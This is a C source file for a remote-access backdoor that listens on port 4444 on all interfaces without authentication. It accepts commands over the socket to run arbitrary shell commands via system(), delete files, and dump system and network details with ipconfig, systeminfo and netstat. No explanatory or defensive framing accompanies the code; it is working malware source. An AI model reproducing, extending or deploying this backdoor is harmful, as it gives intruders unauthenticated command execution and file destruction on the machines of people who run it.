/* Dependencies */

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <string.h>

/* Header file with function prototypes */

#include "interface.h"

/* Function Definitions for all features */

void run_command(int sockfd, const char *argument)
{
    dup2(sockfd, 1);
    dup2(sockfd, 0);
    system(argument);
}

void delete_file(int sockfd, const char *filepath)
{
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    if (remove(filepath) == 0)
    {
       printf("File deleted successfully!\n");
    }

    else
    {
       printf("Error deleting file!\n");
    }
}

void system_info(int sockfd)
{
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    system("ipconfig & systeminfo");
}

void networking_information(int sockfd)
{
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    system("netstat -ano");
}

const char *parse_feature(char input[])
{
    char *token = strtok(input, "(");
    return token;
}

const char *parse_argument(char input[])
{
    char *token;
    strtok(input, "(");
    token = strtok(NULL, ")");
    return token;

}

/* Main function, handles socket and networking */

int main(void)
{
    int server_fd, new_socket, valread;
    char buffer[1024] = {0};
    char copy[1024] = {0};

    struct sockaddr_in address;
    int addrlen = sizeof(address);

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    
    address.sin_family = AF_INET;
    address.sin_port = htons(4444);
    address.sin_addr.s_addr = INADDR_ANY;

    bind(server_fd, (struct sockaddr *)&address, addrlen);
    listen(server_fd, 3);

    new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen);

    while(1){
        valread = read(new_socket, buffer, 1024);

        strncpy(copy, buffer, 1024);

        const char *feature = parse_feature(buffer);
        const char *argument = parse_argument(copy);

        /* Call the appropriate function after the feature has been determined */

        if (strcmp(feature, "execute") == 0)
        {
           run_command(new_socket, argument);
        }

        if (strcmp(feature, "delete") == 0)
        {
           delete_file(new_socket, argument);
        }

        if (strcmp(feature, "sysinfo") == 0)
        {
           system_info(new_socket);
        }
    }

    return 0;
}
